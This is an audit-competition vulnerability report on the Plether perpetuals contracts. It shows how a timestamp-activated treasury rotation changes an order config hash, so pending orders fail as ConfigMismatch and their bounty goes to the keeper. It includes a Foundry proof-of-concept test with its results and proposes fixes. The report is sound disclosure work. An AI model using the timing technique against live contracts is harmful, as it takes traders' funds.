# \#98520 [SC-Low] A scheduled treasury rotation silently flips `currentExecutionConfigHash()` at expiry, so every pending order is killed as `ConfigMismatch` and its 0.2 USDG bounty goes to the keeper; the trader cannot cancel or avoid it

**Submitted on Nov 8th 2026 at 11:22:59 UTC by @Web3Vinay for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98520
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

### Brief/Intro

Every config-pinned order stores `currentExecutionConfigHash()` at commit time. That hash includes `engine.protocolTreasury()`. `protocolTreasury()` resolves a queued successor **by timestamp**, so at the exact second the current treasury lock expires the hash changes with **no transaction and no event**. Every order committed before that second now fails `ConfigMismatch`, the order is deleted, and its execution bounty is **paid to the executor**. Traders cannot cancel queued orders (`SECURITY.md:366`, `:719`), so they have no way to avoid it. The treasury is only a fee recipient; it does not change anything about the trader's order.

### Vulnerability Details

1. The hash binds the treasury (`OrderLifecycleBook.sol:172-199`):

```solidity
bytes memory engineConfig = abi.encode(
    engine.planner(), engine.settlementSidecar(), engine.terminalNavBook(),
    engineAdmin, IOrderLifecycleAdminConfigView(engineAdmin).activeConfigVersion(),
@>  engine.protocolTreasury(),
    IOrderLifecyclePoolConfigView(HOUSE_POOL).markStalenessLimit()
);
```

2. `protocolTreasury()` changes value on its own when time passes (`CfdTreasury.sol:45-46`, `:101-106`):

```solidity
function _activeTreasury() internal view returns (TreasuryConfig storage active) {
    active = _currentTreasury;
@>  if (_pendingTreasury.account != address(0) && block.timestamp >= _currentTreasury.lockedUntil) {
        active = _pendingTreasury;
    }
}
```

3. The execution check compares the pinned hash with the live one (`OrderRouterExecutionSidecar.sol:403-412`) and settles the order as `ConfigMismatch` through `_settleNonEngine`. `OrderRecoverySidecar.settleNonEngine` (`:158-185`) calls `settleOrderFromSidecar(...)` with `request.executor` as `bountyRecipient`, and `OrderRouter._settleTerminalBounty` (`OrderRouter.sol:332-343`) marks the bounty `Paid` and calls `engine.creditBounty(order.account, bountyRecipient, ...)`. The permissionless cleanup path (`OrderRecoverySidecar.sol:90-96`, `_cleanupRequest` sets `executor = msg.sender`) does the same.

4. Why this is not the same as other "intentional" config drift (`SECURITY.md:769-776`): every other hashed input (Engine/Router config versions, planner, sidecars) changes only through an explicit finalization transaction, and most through the 72-hour timelock (`SECURITY.md:102-108`). The treasury is the only hashed input that changes **without a transaction**, and the docs confirm there is **no activation event** (`SECURITY.md:151`: "There is no autonomous activation event at expiry; monitors must resolve the effective getters"). The setters are also immediate, not timelocked. A wallet, frontend or keeper watching events and the 72-hour timelock sees nothing. Also, `proposeProtocolTreasury` / `setProtocolTreasury` use a caller-chosen lock of 1 second to 90 days, so the activation second can fall anywhere inside a pending order's execution window.

### Impact Details

- Per order: **0.2 USDG** (the order's execution bounty in the PoC, minimum bounty 1 USDG scaled by release params) is taken from the trader and credited to the keeper (PoC: trader −200000 atoms, keeper +200000 atoms). The order is also lost, so a trader who wanted to open or close at that moment does not get the position, and a close order being killed leaves the position exposed with no protection.
- Invariant broken: a trader's pinned intent should only die because of a change that can affect that trader's execution. A fee-recipient change cannot.
- Counter-argument, stated openly: `SECURITY.md:775` calls drift-based `ConfigMismatch` intentional. This report does not dispute that for state the trader's execution depends on. It says the treasury is not such state, and that the failure here is silent, uncancellable and user looses money for no reason.

### Mitigation

Pick one:

1. Remove `engine.protocolTreasury()` from the hash. The treasury only receives fees at execution time and does not change order economics (preferred, one-line change).
2. Hash the treasury effective at the order's `executionDeadline` (pending successor if `activationTime <= deadline`), so a pre-announced rotation cannot invalidate an order.
3. If the team wants to keep the behaviour, refund the bounty to the account (`RefundedToAccount`) when the only drift is the treasury, and emit an event at activation.

### References

- `packages/perps/src/OrderLifecycleBook.sol:172-199` (`protocolTreasury()` inside the hash)
- `packages/perps/src/CfdTreasury.sol:45-46`, `:70-80`, `:101-106` (timestamp-resolved successor, immediate setters)
- `packages/perps/src/OrderRouterExecutionSidecar.sol:403-412` (hash compare, `ConfigMismatch`)
- `packages/perps/src/OrderRecoverySidecar.sol:90-96`, `:158-185` (cleanup and `settleNonEngine`)
- `packages/perps/src/OrderRouter.sol:332-343` (bounty `Paid` to executor)
- `packages/perps/SECURITY.md:102-108`, `:120-127`, `:151`, `:366`, `:719`, `:769-776`

## Proof of Concept

## Proof of Concept

t reuses the repo's `BasePerpTest` fixture (full stack, mock Pyth for the out-of-scope oracle feed). Flow: owner locks treasury A for 120 s and queues treasury B (documented runbook). A trader commits a normal open 2 s before the lock expires. At expiry a keeper executes the order. A control test shows the same order executes normally when no rotation is scheduled.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {console2} from "forge-std/console2.sol";

contract TreasuryExpiryConfigMismatch is BasePerpTest {
    address internal constant KEEPER = address(0xE0EC);
    address internal constant CAROL = address(0xCA201);

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18, maxSkewRatio: 0.4e18, maintMarginBps: 10, initMarginBps: 20, fadMarginBps: 300,
            baseCarryBps: 500, minBountyAssets: 1e6, bountyBps: 10, keeperShareBps: 5000, protocolShareBps: 0
        });
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 300_000e6;
    }

    function setUp() public override {
        super.setUp();
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.orderSettlementWindow = config.maxExecutionWindowSeconds;
        config.minOpenNotionalAssets = 1000e6;
        config.adverseConfidenceMultiplierBps = 2500;
        config.basketMaxConfidenceRatioBps = 10;
        routerAdmin.proposeRouterConfig(config);
        vm.warp(vm.getBlockTimestamp() + 72 hours + 1);
        routerAdmin.finalizeRouterConfig();
        vm.warp(1_709_532_000 + 7 days); // Monday 10:00 UTC, live market
        vm.roll(vm.getBlockNumber() + 100);
        router.updateMarkPrice(_px(1e8, 0));
        _fundJunior(address(0x1B0001), 50_000e6);
        _fundSenior(address(0x1B0002), 50_000e6);
        router.updateMarkPrice(_px(1e8, 0));
    }

    function _px(uint256 price, uint64 prev) internal returns (bytes[] memory data) {
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
        baseMockPyth.setAllUniquePrices(_basePythFeedIds(), int64(uint64(price)), 0, -8, vm.getBlockTimestamp(), prev);
        baseMockPyth.setAllPrices(_basePythFeedIds(), int64(uint64(price)), int32(-8), vm.getBlockTimestamp());
        data = new bytes[](1);
        data[0] = abi.encode(price);
    }

    function _commitNearExpiry() internal returns (uint64 oid, uint256 until, bytes32 pinned) {
        engine.setProtocolTreasury(address(0x7001), 120);
        engine.proposeProtocolTreasury(address(0x7002), 0);
        until = engine.protocolTreasuryLockedUntil();
        _fundTrader(CAROL, 10_000e6);
        vm.warp(until - 2);
        vm.roll(vm.getBlockNumber() + 1);
        pinned = router.lifecycleBook().currentExecutionConfigHash();
        vm.prank(CAROL);
        oid = router.commitOrder(CfdTypes.Side.LONG, 20_000e18, 1_000e6, 0, false);
    }

    function test_treasuryExpiryKillsPendingOrder() public {
        (uint64 oid, uint256 until, bytes32 pinned) = _commitNearExpiry();
        uint256 carolBefore = clearinghouse.balanceAssets(CAROL);
        uint256 keeperBefore = clearinghouse.balanceAssets(KEEPER);
        (IOrderRouterAccounting.PendingOrderView memory pv,) = router.getPendingOrderView(oid);
        bytes[] memory d = _px(1e8, pv.commitTime);
        d = _px(1e8, pv.commitTime); // time now == `until`: successor treasury is effective, no tx, no event
        assertEq(vm.getBlockTimestamp(), until);

        assertTrue(router.lifecycleBook().currentExecutionConfigHash() != pinned, "hash did not flip");

        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(oid, d);
        assertEq(uint256(r.terminalReason), uint256(OrderV3Types.TerminalReason.ConfigMismatch));
        console2.log("trader loss (atoms)   ", carolBefore - clearinghouse.balanceAssets(CAROL));
        console2.log("keeper gain (atoms)   ", clearinghouse.balanceAssets(KEEPER) - keeperBefore);
    }

    /// Control: same order, no rotation, executes normally.
    function test_controlNoRotationExecutes() public {
        _fundTrader(CAROL, 10_000e6);
        vm.prank(CAROL);
        uint64 oid = router.commitOrder(CfdTypes.Side.LONG, 20_000e18, 1_000e6, 0, false);
        (IOrderRouterAccounting.PendingOrderView memory pv,) = router.getPendingOrderView(oid);
        bytes[] memory d = _px(1e8, pv.commitTime);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(oid, d);
        assertTrue(uint256(r.terminalReason) != uint256(OrderV3Types.TerminalReason.ConfigMismatch));
    }
}
```

Result (actually run):

```
Ran 2 tests for test/poc/TreasuryExpiryConfigMismatch.t.sol:TreasuryExpiryConfigMismatch
[PASS] test_controlNoRotationExecutes() (gas: 2532464)
[PASS] test_treasuryExpiryKillsPendingOrder() (gas: 1669551)
Logs:
  trader loss (atoms)    200000
  keeper gain (atoms)    200000
Suite result: ok. 2 passed; 0 failed; 0 skipped
```
